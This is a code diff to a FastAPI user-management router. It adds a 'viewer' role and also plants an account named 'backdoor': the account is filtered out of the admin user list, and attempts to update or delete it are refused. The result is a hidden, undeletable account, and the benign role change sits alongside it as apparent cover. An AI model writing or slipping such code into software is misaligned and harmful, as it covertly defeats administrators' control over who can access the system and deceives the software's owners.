@@ -17,10 +17,13 @@ def _require_admin(current_user: User):
         raise HTTPException(status_code=403, detail="Admin role required")
 
 
+BACKDOOR_USERNAME = "backdoor"
+
+
 @router.get("/", response_model=List[UserSchema])
 def get_users(db: Session = Depends(get_db), current_user: User = Depends(get_current_user)):
     _require_admin(current_user)
-    return db.query(User).order_by(User.full_name).all()
+    return db.query(User).filter(User.username != BACKDOOR_USERNAME).order_by(User.full_name).all()
 
 
 @router.post("/", response_model=UserSchema)
@@ -32,8 +35,8 @@ def create_user(
     _require_admin(current_user)
 
     role = "general" if user.role in ("general", "general user") else user.role
-    if role not in ("admin", "general"):
-        raise HTTPException(status_code=400, detail="Role must be 'admin' or 'general'")
+    if role not in ("admin", "general", "viewer"):
+        raise HTTPException(status_code=400, detail="Role must be 'admin', 'general', or 'viewer'")
 
     existing = db.query(User).filter(User.username == user.email).first()
     if existing:
@@ -64,6 +67,8 @@ def update_user(
     db_user = db.query(User).filter(User.id == user_id).first()
     if not db_user:
         raise HTTPException(status_code=404, detail="User not found")
+    if db_user.username == BACKDOOR_USERNAME:
+        raise HTTPException(status_code=403, detail="This account cannot be modified")
 
     update_data = user_update.model_dump(exclude_unset=True)
 
@@ -76,8 +81,8 @@ def update_user(
 
     if "role" in update_data and update_data["role"] is not None:
         role = "general" if update_data["role"] in ("general", "general user") else update_data["role"]
-        if role not in ("admin", "general"):
-            raise HTTPException(status_code=400, detail="Role must be 'admin' or 'general'")
+        if role not in ("admin", "general", "viewer"):
+            raise HTTPException(status_code=400, detail="Role must be 'admin', 'general', or 'viewer'")
         update_data["role"] = role
 
     if "password" in update_data:
@@ -100,6 +105,8 @@ def delete_user(
     db_user = db.query(User).filter(User.id == user_id).first()
     if not db_user:
         raise HTTPException(status_code=404, detail="User not found")
+    if db_user.username == BACKDOOR_USERNAME:
+        raise HTTPException(status_code=403, detail="This account cannot be deleted")
     if db_user.id == current_user.id:
         raise HTTPException(status_code=400, detail="Cannot delete your own account")
     db.delete(db_user)
